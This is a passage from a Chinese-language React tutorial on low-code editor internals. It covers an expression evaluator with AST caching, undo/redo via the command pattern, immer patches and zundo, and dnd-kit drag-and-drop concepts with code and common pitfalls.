          if (typeof l === 'string' && typeof r === 'string') {
            return ast.op === '<' ? l < r : ast.op === '>' ? l > r : ast.op === '<=' ? l <= r : l >= r
          }
          const a = Number(l), b = Number(r)
          return ast.op === '<' ? a < b : ast.op === '>' ? a > b : ast.op === '<=' ? a <= b : a >= b
        }
        case '==': return l == r   // eslint-disable-line eqeqeq —— 刻意保留 JS 宽松等式语义
        case '!=': return l != r   // eslint-disable-line eqeqeq
        case '===': return l === r
        case '!==': return l !== r
      }
    }
  }
}
```

**第 4 模块：对外 API + AST 缓存**

```ts
// ============ 4. 对外 API：解析一次，求值多次 ============
const astCache = new Map<string, Ast>()

export function evaluateExpression(src: string, ctx: Record<string, unknown>): unknown {
  let ast = astCache.get(src)
  if (!ast) {
    ast = parse(src)
    astCache.set(src, ast) // 表达式字符串是缓存键：配置项重复度高，命中率很高
  }
  return evaluate(ast, ctx)
}

/** 只解析不求值——给配置界面做"语法检查/红线提示" */
export function checkExpression(src: string): SyntaxError | null {
  try { parse(src); return null } catch (e) { return e as SyntaxError }
}
```

**测试用例清单**（✍️ 练习的验收标准）：

```ts
const ctx = { $form: { age: 20, name: '', price: 99 }, $user: { vip: true } }
evaluateExpression('1 + 2 * 3', ctx)                          // 7（优先级）
evaluateExpression('(1 + 2) * 3', ctx)                        // 9（括号）
evaluateExpression('-$form.price + 1', ctx)                   // -98（一元负号）
evaluateExpression('$form.age >= 18 && $user.vip', ctx)       // true（比较+逻辑）
evaluateExpression('!$form.name', ctx)                        // true（!'' → true）
evaluateExpression('$form.price > 50 || $user.vip', ctx)      // true（短路，右侧不求）
evaluateExpression('$user.roles', ctx)                        // undefined（安全返回，不抛）
evaluateExpression('"会员价：" + $form.price * 0.8', ctx)      // '会员价：79.2'（拼接+优先级）
checkExpression('$form.age >= ')                              // SyntaxError（语法检查）
evaluateExpression('$form.age >= 18', {})                     // ReferenceError（未注入变量）
```

逐模块讲解到此。回头再品这句话：**词法（切词）、语法（建树）、求值（走树）三段式就是 Babel 的三段式（parse → AST 转换 → generate）和模板引擎的三段式（编译 → AST → 渲染）**。做完这 110 行，你以后读任何"解释器型"源码都有了地图。

**React 集成：useExpression hook**

```tsx
import { useMemo } from 'react'
import { evaluateExpression } from './expr/engine'

/**
 * 在组件里求值表达式；表达式非法或求值出错返回 undefined，绝不炸组件
 * depsKey：手动提供"会影响结果的上下文指纹"（通常是相关字段的值拼接）
 */
export function useExpression<T = unknown>(
  expr: string | undefined,
  ctx: Record<string, unknown>,
  depsKey: string,
): T | undefined {
  return useMemo(() => {
    if (!expr) return undefined
    try {
      return evaluateExpression(expr, ctx) as T
    } catch {
      return undefined // 坏表达式按"条件不成立"处理，同时应在配置期用 checkExpression 提示
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [expr, depsKey])
}

// 用法：字段显隐联动
function DistrictField({ schema, form }: { schema: FormFieldSchema; form: FormData }) {
  const visible = useExpression<boolean>(schema.visibleWhen, { $form: form }, form.city)
  if (!visible) return null
  return <input placeholder={schema.label} />
}
```

#### 常见坑

- **症状**：运营配了个非法表达式（`$form.age >`），整个表单页白屏。
  **根因**：渲染期直接求值且没有 try/catch，语法错误沿渲染树抛出。
  **修法**：双层防御——配置期 `checkExpression` 在输入框下画红线（存盘前拦截）；运行期求值包 try/catch 返回 undefined（上面的 `useExpression` 已内置）。
- **症状**：联动一多，页面明显卡顿，Profile 里看到大量 `parse`。
  **根因**：每次求值都重新 parse（没用 AST 缓存），或每次渲染重建上下文对象导致缓存键失效。
  **修法**：`astCache` 按表达式字符串缓存；上下文注入用稳定引用（zustand selector 取出的数据）；表达式求值放 `useMemo`，依赖用"参与计算的值"而不是整个 `$form`。
- **症状**：`a 依赖 b、b 又依赖 a`，页面卡死或字段闪烁互跳。
  **根因**：联动构成循环，每轮求值都触发下一轮。
  **修法**：单轮求值限制（一次数据变更后所有表达式只统一求值一遍，不在求值中再触发变更）；更完整的方案是建立"字段 → 依赖字段"的依赖图做拓扑排序（第 2 章展开）。
- **症状**：表达式里 `$form.count == 1` 恒为 false。
  **根因**：count 实际是字符串 `'1'`，而配置的人想的是数字（`==` 与 `===` 的语义差在表达式里同样存在）。
  **修法**：在文档与配置提示里明确约定：数值字段注入前先 `Number()` 归一；或干脆在协议层给字段声明数据类型，注入时做类型转换。

### 1.5 Undo/Redo 三种实现

1. 命令模式：每个操作封装 `{ do(), undo() }` — 直观但样板多
2. **immer `produceWithPatches`（推荐）**：任何 mutation 自动生成正/反补丁
3. zundo：zustand 官方 temporal 中间件
- ⚠️ 坑：文本输入类操作必须**合并补丁**（300ms 防抖合并），否则 Cmd+Z 逐字符回退；产生新操作时清空 redo 栈

#### 是什么

撤销/重做 = 给状态变化维护一条可回放的时间线：每次变更记录"如何撤销"（必要时"如何重做"），undo 沿时间线回退、redo 前进。它是编辑器的底线能力——用户敢在画布上大胆操作的前提。

#### 为什么需要

没有撤销的编辑器，用户每个操作都提心吊胆；而撤销要做到"任何操作都可逆"，就不能依赖每种操作自觉补齐 undo 代码——那必然遗漏。正确思路是把"变更"抽象成统一形态（命令或补丁），撤销系统只面对统一形态。

#### 方案一：命令模式（每个操作封装 do/undo）

**怎么做**：把每种编辑操作写成一个对象，内含正向执行与逆向恢复两个方法；历史栈只存命令对象。

```ts
// undo/command.ts
interface Command {
  label: string      // 操作名，UI 显示"撤销 新增节点"
  do(): void
  undo(): void
}

class CommandHistory {
  private undoStack: Command[] = []
  private redoStack: Command[] = []
  private listeners = new Set<() => void>()

  execute(cmd: Command): void {
    cmd.do()
    this.undoStack.push(cmd)
    this.redoStack = []            // ★ 新操作产生 → redo 栈清空（时机见下文）
    this.emit()
  }

  undo(): void {
    const cmd = this.undoStack.pop()
    if (!cmd) return
    cmd.undo()
    this.redoStack.push(cmd)
    this.emit()
  }

  redo(): void {
    const cmd = this.redoStack.pop()
    if (!cmd) return
    cmd.do()
    this.undoStack.push(cmd)
    this.emit()
  }

  private emit(): void { this.listeners.forEach((l) => l()) }
  get canUndo(): boolean { return this.undoStack.length > 0 }
  get canRedo(): boolean { return this.redoStack.length > 0 }
}
```

具体命令——以 1.7 会用的扁平 schema store（`nodes` 表 + `childIds` 表）为例：

```ts
import { produce } from 'immer'
import type { SchemaStore } from './schemaStore'

/** 新增节点：do 插入，undo 删掉 */
function makeAddNode(
  store: SchemaStore,
  parentId: string,
  node: NodeDoc,
  index: number,
): Command {
  return {
    label: `新增 ${node.type}`,
    do() {
      store.setState((s) =>
        produce(s, (d) => {
          d.nodes[node.id] = node
          d.childIds[parentId].splice(index, 0, node.id)
        }),
      )
    },
    undo() {
      store.setState((s) =>
        produce(s, (d) => {
          delete d.nodes[node.id]
          d.childIds[parentId].splice(index, 1)
        }),
      )
    },
  }
}

/** 修改属性：do 记得先取旧值，undo 写回 */
function makeSetProps(
  store: SchemaStore,
  id: string,
  key: string,
  oldValue: unknown,
  newValue: unknown,
): Command {
  return {
    label: `修改属性 ${key}`,
    do() {
      store.setState((s) => produce(s, (d) => { d.nodes[id].props[key] = newValue }))
    },
    undo() {
      store.setState((s) => produce(s, (d) => { d.nodes[id].props[key] = oldValue }))
    },
  }
}
```

**评价**：优点是直观（每个操作的逆操作白纸黑字）、可组合（宏命令 = 数组命令一次 execute）。缺点致命：每种操作要写两套逻辑；`makeSetProps` 要求调用方**先取 oldValue**——忘了就做成"单向撤销"；最痛的是文本输入合并：输入"abc"是 3 次 setProps 命令，命令模式要合并得给 Command 加 `mergeWith` 方法、历史栈加合并逻辑，样板进一步膨胀。所以它适合"操作种类少且需要自定义逆逻辑"的场景，做 schema 编辑器不划算。

#### 方案二（推荐主方案）：immer `produceWithPatches`

**原理**：immer 的 draft 代理在生成新状态的同时，能产出**正向补丁**（怎么从旧到新）与**反向补丁**（怎么从新回旧）。于是"任何 mutation 自动获得 undo/redo"——你只写一遍正向逻辑，逆方向是白送的。这正是它对编辑器的价值：变更逻辑只写一遍，漏写 undo 的风险为零。

**为什么必须 `enablePatches()`**：补丁生成是 immer 的插件能力（会带来一些体积与性能开销），需要显式开启。补丁的数据结构是 `{ op: 'add' | 'replace' | 'remove'; path: (string|number)[]; value? }` 三元组：

```ts
import { applyPatches, enablePatches, produceWithPatches } from 'immer'
enablePatches()

// 一次 mutation 同时拿到三样东西：
const [next, patches, inverse] = produceWithPatches(
  { profile: { name: 'a' }, tags: ['x'] },
  (draft) => {
    draft.profile.name = 'b'
    draft.tags.push('y')
  },
)
// next:    { profile: { name: 'b' }, tags: ['x', 'y'] }
// patches: [
//   { op: 'replace', path: ['profile', 'name'], value: 'b' },
//   { op: 'add', path: ['tags', 1], value: 'y' },
// ]
// inverse: [
//   { op: 'replace', path: ['profile', 'name'], value: 'a' },
//   { op: 'remove', path: ['tags', 1] },
// ]
```

**正/反补丁的应用**：`applyPatches(state, patches)` 把补丁打到任意状态上。撤销 = 对当前状态打反向补丁；重做 = 打正向补丁——这就是"时间线"的全部机制：

```ts
const undone = applyPatches(next, inverse) // 回到旧状态
const redone = applyPatches(undone, patches) // 再前进到新状态
```

**完整实现：基于 zustand 的历史 store（推荐方案的完整代码）**

```ts
// undo/historyStore.ts
import { create } from 'zustand'
import { applyPatches, enablePatches, produceWithPatches, type Patch } from 'immer'

enablePatches()

interface NodeDoc {
  id: string
  type: string
  title: string
  props: Record<string, unknown>
}

/** 扁平化 schema：nodes 表 + 孩子顺序表（1.7 会解释为什么扁平化） */
interface SchemaDoc {
  nodes: Record<string, NodeDoc>
  childIds: Record<string, string[]>
  rootId: string
}

interface HistoryEntry {
  patches: Patch[]     // 正向：从"改前"到"改后"
  inverse: Patch[]     // 反向：从"改后"回到"改前"
  label: string        // 操作名（"撤销 新增 input"）
  mergeKey?: string    // 合并标识：同一输入框的连续输入才会合并
  time: number         // 提交时间：判断是否落在合并窗口内
}

interface HistoryStore {
  present: SchemaDoc   // 当前状态
  past: HistoryEntry[] // 已提交的历史（栈顶最近）
  future: HistoryEntry[] // 被 undo 的条目（redo 来源）
  commit: (label: string, recipe: (draft: SchemaDoc) => void, mergeKey?: string) => void
  undo: () => void
  redo: () => void
  jump: (steps: number) => void
  reset: (doc: SchemaDoc) => void
}

const MERGE_WINDOW = 300 // ms

export const useHistoryStore = create<HistoryStore>()((set, get) => ({
  present: { nodes: {}, childIds: { root: [] }, rootId: 'root' },
  past: [],
  future: [],

  /** 所有编辑操作的唯一入口：写一遍正向逻辑，补丁自动生成 */
  commit: (label, recipe, mergeKey) => {
    const { present, past } = get()
    const [next, patches, inverse] = produceWithPatches(present, recipe)
    if (patches.length === 0) return // 状态没变就不入历史（避免空撤销）

    const now = Date.now()
    const last = past[past.length - 1]
    const mergeable =
      mergeKey != null &&               // 本次声明了合并键
      last?.mergeKey === mergeKey &&    // 与上一条是同一个输入源
      now - last.time <= MERGE_WINDOW   // 且在时间窗口内

    if (mergeable) {
      // 合并：不新增条目，把本次补丁"接"到上一条后面
      const merged: HistoryEntry = {
        patches: [...last.patches, ...patches], // 正向：先旧后新（按发生顺序重放）
        inverse: [...inverse, ...last.inverse], // 反向：先新后旧（逆序回退）
        label: last.label,
        mergeKey,
        time: now, // 窗口从最后一次输入重新计时
      }
      set({ present: next, past: [...past.slice(0, -1), merged], future: [] })
    } else {
      set({
        present: next,
        past: [...past, { patches, inverse, label, mergeKey, time: now }],
        future: [], // ★ 关键：产生新操作时清空 redo 栈
      })
    }
  },

  /** 撤销：对当前状态应用"栈顶条目"的反向补丁 */
  undo: () => {
    const { present, past, future } = get()
    const last = past[past.length - 1]
    if (!last) return
    const prev = applyPatches(present, last.inverse)
    set({ present: prev, past: past.slice(0, -1), future: [last, ...future] })
  },

  /** 重做：对当前状态应用"队头条目"的正向补丁 */
  redo: () => {
    const { present, past, future } = get()
    const [entry, ...rest] = future
    if (!entry) return
    const next = applyPatches(present, entry.patches)
    set({ present: next, past: [...past, entry], future: rest })
  },

  /** 多步跳转：撤销历史面板"回到 5 步前" */
  jump: (steps) => {
    let { present, past, future } = get()
    const n = Math.max(-past.length, Math.min(steps, future.length))
    if (n < 0) {
      const moved = past.slice(n) // n 为负：取出最后 |n| 条
      past = past.slice(0, n)
      for (const entry of moved) present = applyPatches(present, entry.inverse)
      future = [...moved.reverse(), ...future]
    } else if (n > 0) {
      const moved = future.slice(0, n)
      future = future.slice(n)
      for (const entry of moved) present = applyPatches(present, entry.patches)
      past = [...past, ...moved]
    }
    set({ present, past, future })
  },

  /** 外部导入新 schema：重置历史（也可改为入一条"整体替换"补丁） */
  reset: (doc) => set({ present: doc, past: [], future: [] }),
}))
```

业务操作层只写正向 recipe，并声明 mergeKey：

```ts
// undo/actions.ts
import { nanoid } from 'nanoid'
import { useHistoryStore } from './historyStore'

export const schemaActions = {
  setProps(id: string, key: string, value: unknown) {
    useHistoryStore.getState().commit(
      `修改属性 ${key}`,
      (draft) => {
        draft.nodes[id].props[key] = value
      },
      `setProps:${id}:${key}`, // 同一个输入框的连续输入 → 合并键相同
    )
  },

  addNode(parentId: string, type: string, index?: number) {
    const id = nanoid(8)
    useHistoryStore.getState().commit('新增节点', (draft) => {
      draft.nodes[id] = { id, type, title: type, props: {} }
      const list = draft.childIds[parentId]
      list.splice(index ?? list.length, 0, id)
    })
    // 无 mergeKey：结构操作永不合并
  },

  removeNode(id: string) {
    useHistoryStore.getState().commit('删除节点', (draft) => {
      const parentId = findParentId(draft, id)
      const list = draft.childIds[parentId]
      list.splice(list.indexOf(id), 1)
      delete draft.nodes[id]
      // 子孙节点清理：遍历删除（undo 时靠反向补丁整体恢复，不需要手写"删了什么"）
    })
  },

  moveNode(id: string, from: number, to: number) {
    useHistoryStore.getState().commit('移动节点', (draft) => {
      const list = draft.childIds[findParentId(draft, id)]
      const [moved] = list.splice(from, 1)
      list.splice(to, 0, moved)
    })
  },
}
```

注意 `removeNode` 的注释：**删除一整个子树不用手写"恢复子树"的 undo**——反向补丁天然包含整棵子树的恢复。这是补丁方案对命令模式的降维优势。

UI 接线：

```tsx
// undo/HistoryBar.tsx
import { useEffect } from 'react'
import { useHistoryStore } from './historyStore'

export function HistoryBar() {
  const undo = useHistoryStore((s) => s.undo)
  const redo = useHistoryStore((s) => s.redo)
  const canUndo = useHistoryStore((s) => s.past.length > 0)
  const canRedo = useHistoryStore((s) => s.future.length > 0)

  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      const meta = e.metaKey || e.ctrlKey
      if (!meta || e.key.toLowerCase() !== 'z') return
      e.preventDefault() // 阻止浏览器默认的输入框内撤销，避免双轨冲突
      const { undo: u, redo: r } = useHistoryStore.getState()
      e.shiftKey ? r() : u() // Cmd+Z 撤销 / Cmd+Shift+Z 重做
    }
    window.addEventListener('keydown', onKey)
    return () => window.removeEventListener('keydown', onKey)
  }, [])

  return (
    <div>
      <button disabled={!canUndo} onClick={undo}>撤销</button>
      <button disabled={!canRedo} onClick={redo}>重做</button>
    </div>
  )
}
```

**300ms 补丁合并：为什么以及怎么算**

为什么必须合并：属性面板输入框每敲一个字符触发一次 `setProps`，若每次都入历史，"输入 5 个字符 → Cmd+Z 按五次才删完"，且历史栈被 5 条同质补丁灌满。产品预期是"一次 Cmd+Z 撤销整串输入"。

合并的数学（上面 `commit` 里两行注释的展开）：设连续两次修改 e1（补丁 p1 / 反补丁 i1）、e2（p2 / i2），合并后条目为：

- 正向 `[...p1, ...p2]`：从 e1 之前的状态按发生顺序重放 p1、p2，结果等于 e2 之后的状态（补丁是确定性操作，顺序重放即复现）；
- 反向 `[...i2, ...i1]`：从 e2 之后的状态先撤销 e2 再撤销 e1，逆序回退到 e1 之前。

验证一下字符输入：p1 = replace name ''→'a'，p2 = replace name 'a'→'ab'。undo 时打 `[i2, i1]` = replace 'ab'→'a' 再 replace 'a'→''，一次 Cmd+Z 回到空串。正确。

三个实现细节：`mergeKey` 必须能定位到"同一个输入源"（`setProps:{id}:{key}`），否则改 A 属性的补丁会错误合并进改 B 属性的历史；窗口从**最后一次**输入重新计时（用户停顿 300ms 以上就切新条目，两段输入可分别撤销）；结构操作（增删移动节点）永远不带 mergeKey。

**redo 栈清空时机：为什么"产生新操作就清空"**

规则：任何新的 commit（包括合并进旧条目的输入）发生时，`future` 必须清空。原因不是惯例而是正确性：future 里的补丁是**针对它被撤销时的状态**计算的。走一个反例：

1. 用户删除节点 X（补丁记录 path `['nodes', 'x']`），undo 恢复 X，此时该条目进入 future；
2. 用户改为删除节点 Y——**没有清空 future**，继续操作；
3. 用户点 redo：系统把"恢复 X"的补丁打到当前状态上。若步骤 2 之后的结构变化恰好挪动了相关索引，redo 会把补丁打到**错误的路径**上——轻则状态错乱，重则 immer 直接抛"路径不存在"。即便侥幸不错乱，redo 出来的"恢复 X"也不是用户期待的语义。

时间线分叉（undo 之后做新操作 = 走进了新分支）在语义上就该丢弃旧分支，这是所有编辑器（VSCode、Figma）的一致行为。另一个容易忽视的时机：**纯视图状态不要进历史**——选中态切换、面板开合如果也走 commit，会白白清空 redo 栈并灌入无意义历史。选中态应放独立 store（第 3 章实践）。

#### 方案三：zundo（zustand 官方 temporal 中间件）

**原理**：zundo 不算补丁，它给任何 zustand store 外挂一个"时间线 store"，自动把**状态快照**压栈（默认 limit 100）。零侵入、十行接入，代价是内存 O(limit × 状态体积)。

```ts
// undo/zundoStore.ts
import { create } from 'zustand'
import { temporal } from 'zundo'
import { produce } from 'immer'

interface EditorState {
  nodes: Record<string, NodeDoc>
  selectedId: string | null
  setProps: (id: string, key: string, value: unknown) => void
  select: (id: string | null) => void
}

export const useEditorStore = create<EditorState>()(
  temporal(
    (set) => ({
      nodes: {},
      selectedId: null, // 选中态留在主 store，但用 partialize 把它排除出历史
      setProps: (id, key, value) =>
        set((s) => ({
          nodes: produce(s.nodes, (d) => {
            d[id].props[key] = value
          }),
        })),
      select: (id) => set({ selectedId: id }),
    }),
    {
      limit: 100,
      // 只跟踪 schema 本体：选中态等瞬态不入历史
      partialize: (state) => ({ nodes: state.nodes, selectedId: undefined }),
      // 相等性判断：nodes 引用没变（immer 结构共享）就不压栈，挡掉无意义快照
      equality: (pastState, currentState) => pastState.nodes === currentState.nodes,
      // 输入类高频 set 的合并：300ms 节流压栈（对应 immer 方案的补丁合并）
      handleSet: (handleSet) => {
        let timer: ReturnType<typeof setTimeout> | null = null
        let pending: EditorState | null = null
        return (state) => {
          pending = state
          if (timer) return
          timer = setTimeout(() => {
            timer = null
            if (pending) handleSet(pending)
          }, 300)
        }
      },
    },
  ),
)
```

```tsx
// undo/ZundoBar.tsx —— temporal 是一个独立 store，可订阅其撤销能力
import { useEditorStore } from './zundoStore'

export function ZundoBar() {
  const undo = useEditorStore.temporal((t) => t.undo)
  const redo = useEditorStore.temporal((t) => t.redo)
  const canUndo = useEditorStore.temporal((t) => t.pastStates.length > 0)
  const canRedo = useEditorStore.temporal((t) => t.futureStates.length > 0)
  return (
    <div>
      <button disabled={!canUndo} onClick={() => undo()}>撤销</button>
      <button disabled={!canRedo} onClick={() => redo()}>重做</button>
    </div>
  )
}
```

`handleSet` 的节流语义与 immer 方案的 mergeKey 不同：它是**全局时间维**的合并（300ms 内的一切变更合成一帧），实现简单但"同时改两个输入框"会被错误合并；mergeKey 是**输入源维度**的合并，更精确。这是"快照+节流"与"补丁+合并键"的真实差异点。

#### 三方案对比

| | 命令模式 | immer patches（推荐） | zundo |
|---|---|---|---|
| 原理 | 每操作手写 do/undo | 数据 diff 出正/反补丁 | 快照时间线 |
| 变更逻辑要写几遍 | 两遍（易漏） | 一遍 | 一遍 |
| 内存 | 小 | O(变更大小) | O(limit × 状态体积) |
| 输入合并 | 手工扩展 | mergeKey（精细） | handleSet 节流（粗粒度） |
| 侵入性 | 高（每个操作包命令） | 低（统一 commit 入口） | 极低（包一层中间件） |
| 适合 | 操作少、需自定义逆逻辑（如复杂协同） | schema/文档类编辑器 | 快速接入、状态不大的应用 |

#### 常见坑

- **症状**：点撤销，历史条目弹出了，画布却没变化。
  **根因**：组件订阅的是旧状态引用（比如绕过 store 直接持有对象），或 undo 分支里忘了 `applyPatches` 返回新状态而是原地改。
  **修法**：撤销后状态必须是 `applyPatches(present, inverse)` 的**返回值**（不可变更新），组件全部通过 selector 订阅 store，不要缓存 store 外的对象引用。
- **症状**：Cmd+Z 一次只回退半个字符，或者撤销后状态"错位"。
  **根因**：mergeKey 设计错误——不同输入源共用了一个 key（如所有 setProps 都用 `'input'`），或合并窗口内混入了结构操作。
  **修法**：mergeKey 精确到 `{nodeId}:{propKey}`；结构操作绝不传 mergeKey。
- **症状**：zundo 方案下内存随编辑时间线性上涨。
  **根因**：快照方案固有成本 + limit 设得过大 + 把大对象（图片 base64 之类）放进了被 partialize 的状态。
  **修法**：收紧 limit；partialize 只留真正需要撤销的字段；状态很大时换 immer patches 方案。
- **症状**：聚焦在输入框里按 Cmd+Z，有时撤了输入框、有时撤了画布。
  **根因**：浏览器原生输入框撤销与全局历史"双轨"竞争。
  **修法**：全局 keydown 里判断 `document.activeElement` 是否可编辑，可编辑时优先让原生处理（或统一 preventDefault 走全局历史，二选一并保持一致）。

---

### 1.6 拖拽原理（dnd-kit 精讲）

- 核心概念：`DndContext` / `useDraggable` / `useDroppable` / `useSortable` / `DragOverlay`
- Sensors：Pointer / Keyboard（无障碍）/ Touch；启动延迟 vs 启动距离（点击与拖拽冲突）
- 碰撞算法选择：`closestCenter`（排序）vs `closestCorners` vs `pointerWithin`（嵌套容器必用组合策略）
- **DragOverlay 预览层**：拖动时渲染"替身"，避免原元素被拉伸导致布局跳动（高频坑）
- ✍️ 练习：两个列表互拖 + Kanban 多列嵌套排序（含键盘拖拽）

#### 是什么

dnd-kit 是一套 headless（无头）拖拽原语库：它负责拖拽的全部**行为**（传感器、碰撞检测、键盘无障碍、自动滚动），不负责任何**样式**。相比 `react-beautiful-dnd`（已停止维护）和原生 HTML5 DnD（移动端几乎不可用、样式定制困难），dnd-kit 是当前 React 拖拽的事实标准，也是第 3 章表单设计器、第 6 章低代码画布的拖拽地基。

"headless"的含义：hook 返回 `transform`（位移）、`isDragging`（状态）等数据，元素长什么样、拖影是什么、容器多高，全由你决定。行为与 UI 分离，正好匹配本章"内核与物料分离"的思想。

#### 五个核心概念逐个讲

**概念 1：`DndContext`——拖拽会话的总控**

一条拖拽链路里只放一个 `DndContext`（dnd-kit 实际支持嵌套 DndContext 以实现拖拽把手等场景，但本课程的约定是：一个画布一个 DndContext，避免碰撞检测归属歧义），它统一配置传感器、碰撞算法、无障碍播报，并接管整段生命周期回调。一次拖拽从 pointerdown 到松手是一个"会话"，所有状态（谁在被拖、悬停在谁上）都由它调度：

```tsx
import {
  DndContext, PointerSensor, KeyboardSensor,
  useSensor, useSensors, closestCenter,
  type DragStartEvent, type DragOverEvent, type DragEndEvent,
} from '@dnd-kit/core'

function Board() {
  const sensors = useSensors(
    useSensor(PointerSensor, { activationConstraint: { distance: 5 } }),
    useSensor(KeyboardSensor),
  )

  function handleDragStart(e: DragStartEvent) { /* 记录 activeId，供 DragOverlay 显示替身 */ }
  function handleDragOver(e: DragOverEvent) { /* 拖动过程中实时响应"悬停到了谁上" */ }
  function handleDragEnd(e: DragEndEvent) { /* 松手落位：数据变更在这里做 */ }

  return (
    <DndContext
      sensors={sensors}
      collisionDetection={closestCenter}
      onDragStart={handleDragStart}
      onDragOver={handleDragOver}
      onDragEnd={handleDragEnd}
    >
      {/* 可拖/可放的元素都挂在 context 内 */}
    </DndContext>
  )
}
```

生命周期分工必须记牢：`onDragStart` 只做记录；`onDragOver` 做跨容器实时搬运（体验关键）；`onDragEnd` 做最终排序落位与数据提交。状态更新（undo 历史、store 写入）集中在 `onDragEnd`，`onDragOver` 里只做"搬运预览"级别的状态调整。

**概念 2：`useDraggable`——把元素变成"可拖的"**

```tsx
import { useDraggable } from '@dnd-kit/core'
import { CSS } from '@dnd-kit/utilities'

function MaterialCard({ id, label }: { id: string; label: string }) {
  const { attributes, listeners, setNodeRef, transform, isDragging } = useDraggable({ id })

  return (
    <button
      ref={setNodeRef}   // 元素本体注册进拖拽系统
      {...listeners}     // pointerdown 等事件绑定（必须挂上才能拖）
      {...attributes}    // role/aria-*/tabindex：键盘与读屏支持
      style={{
        // 位移用 translate 而不是改 left/top：只走合成层，不触发 layout
        transform: CSS.Translate.toString(transform),
        opacity: isDragging ? 0.5 : 1, // 被拖起时的样式反馈
      }}
    >
      {label}
    </button>
  )
}
```

`attributes` 值得单独强调：它包含 `role="button"`、`aria-describedby`、`tabindex`，是键盘拖拽与读屏播报（"已抬起，按方向键移动"）的基础。丢弃 attributes 等于丢掉无障碍。

**概念 3：`useDroppable`——把元素变成"可放的"**

```tsx
import { useDroppable } from '@dnd-kit/core'

function DropZone({ id }: { id: string }) {
  const { setNodeRef, isOver } = useDroppable({ id })
  return (
    <div
      ref={setNodeRef}
      style={{
        minHeight: 80,
        outline: isOver ? '2px dashed skyblue' : '1px dashed #ccc', // 悬停高亮
      }}
    >
      放到这里
    </div>
  )
}
```

`isOver` 表示"当前拖拽物悬停在我上方"，由碰撞检测算法裁决——它判得准不准，取决于你选的碰撞算法（下文）。设计器"物料区 → 画布"的拖入，目标 droppable 就是各容器节点。

**概念 4：`useSortable`——列表内排序（= draggable + droppable + 排序动画）**

排序场景要的是"拖起第 2 项，其余项实时腾位"，手动组合 draggable+droppable 很难写对，`useSortable` 打包了全部三件事，配合 `SortableContext` 提供列表上下文（items 顺序、排序策略）：

```tsx
import { SortableContext, useSortable, verticalListSortingStrategy } from '@dnd-kit/sortable'
import { CSS } from '@dnd-kit/utilities'

function SortableItem({ id, title }: { id: string; title: string }) {
  const {
    attributes, listeners,
    setNodeRef, setActivatorNodeRef, // 后者：把手元素（只有把手能拖，其余区域可放按钮/输入框）
    transform, transition, isDragging,
  } = useSortable({ id })

  return (
    <li
      ref={setNodeRef}
      style={{
        transform: CSS.Transform.toString(transform), // 腾位动画的位移
        transition,                                    // 腾位动画的缓动（库算好时长）
        opacity: isDragging ? 0.4 : 1,
      }}
    >
      <span ref={setActivatorNodeRef} {...listeners} {...attributes} className="handle">
        ⠿ 拖我
      </span>
      <span>{title}</span>
      <button onClick={() => console.log('正常点击不受拖拽影响')}>操作</button>
    </li>
  )
}

function SortableList({ items }: { items: { id: string; title: string }[] }) {
  return (
    <SortableContext items={items.map((i) => i.id)} strategy={verticalListSortingStrategy}>
      <ul>{items.map((item) => <SortableItem key={item.id} id={item.id} title={item.title} />)}</ul>
    </SortableContext>
  )
}
```

`onDragEnd` 里用 `arrayMove` 完成数据落位：

```tsx
import { arrayMove } from '@dnd-kit/sortable'

function handleDragEnd({ active, over }: DragEndEvent) {
  if (!over || active.id === over.id) return
  const oldIndex = items.findIndex((i) => i.id === active.id)
  const newIndex = items.findIndex((i) => i.id === over.id)
  setItems((prev) => arrayMove(prev, oldIndex, newIndex)) // 不可变移动
}
```

策略（strategy）还有 `horizontalListSortingStrategy`、`rectSortingStrategy`（网格）等，按列表方向选。`items` 传 id 数组——又见 1.1 的"稳定 id"原则，dnd-kit 全链路用 id 标识条目。

**概念 5：`DragOverlay`——拖拽预览层（替身）**

```tsx
import { DndContext, DragOverlay } from '@dnd-kit/core'

function Board() {
  const [activeId, setActiveId] = useState<string | null>(null)
  const activeItem = items.find((i) => i.id === activeId)

  return (
    <DndContext
      sensors={sensors}
      onDragStart={(e) => setActiveId(String(e.active.id))}
      onDragEnd={(e) => { handleDragEnd(e); setActiveId(null) }}
      onDragCancel={() => setActiveId(null)}
    >
      <SortableList items={items} />
      {/* 替身：渲染在 body 级 portal，跟随指针，落点动画由 dropAnimation 配置 */}
      <DragOverlay dropAnimation={{ duration: 180, easing: 'cubic-bezier(0.2, 0, 0, 1)' }}>
        {activeItem ? <ItemCard item={activeItem} overlay /> : null}
      </DragOverlay>
    </DndContext>
  )
}
```

**DragOverlay 为什么能防布局跳动**（高频坑的原理）。不用 overlay 时，位移 `transform` 直接打在**原元素**上，而原元素仍在文档流里占着位置，问题接连而来：

1. **被拉伸/裁剪**：原元素受父容器约束——flex 拉伸、`overflow: hidden` 裁剪、`max-width` 换行。拖到列表边缘时替身"变扁""被切角"，就是原元素被父容器揉捏的结果；
2. **"取出原元素"的两难**：你想给原元素 `position: fixed` 让它脱离约束？原位置立即塌陷，兄弟节点先整体跳一下（补位），落点处再跳一下（回填）——这就是"布局跳动"的直接来源；
3. **每帧 layout**：跟随指针若靠改 `left/top`，每帧触发重排。

DragOverlay 的解法：原元素**留在原地**（半透明显示，布局纹丝不动），替身渲染在 `DndContext` 外层的 portal 里（body 直属、`position: fixed`、不受任何业务容器约束），跟随指针只改 `transform`——合成层动画，零 layout。落点动画（dropAnimation）由库统一收尾。总结成一句：**占位与跟随分离，布局天然稳定**。

#### Sensors：启动延迟 vs 启动距离

**问题的本质**：`pointerdown` 既是"点击"的开始，也是"拖拽"的开始，浏览器无法读心。不做约束的话，想点元素的瞬间就会启动拖拽，click 事件被吞掉；触屏更糟——手指按下即拖拽启动，连列表滚动都做不到（一滚就变拖拽）。所以每种 Sensor 都支持 `activationConstraint`，用两种策略区分意图：

| 策略 | 语义 | 效果 | 适用 |
|---|---|---|---|
| `distance: N` | 移动超过 N 像素才算拖拽 | 按下不动 = 点击（0 干扰），拖拽 0 延迟 | 鼠标/指针 |
| `delay: N` | 按住 N 毫秒才算拖拽 | 按住不动才进入拖拽，期间移动可配 `tolerance` 容忍抖动 | 触屏（保留滚动） |

```tsx
import {
  PointerSensor, TouchSensor, KeyboardSensor,
  useSensor, useSensors,
} from '@dnd-kit/core'
import { sortableKeyboardCoordinates } from '@dnd-kit/sortable'

const sensors = useSensors(
  // 鼠标：移动 5px 才启动 → 点击零延迟、拖拽不误触
  useSensor(PointerSensor, { activationConstraint: { distance: 5 } }),
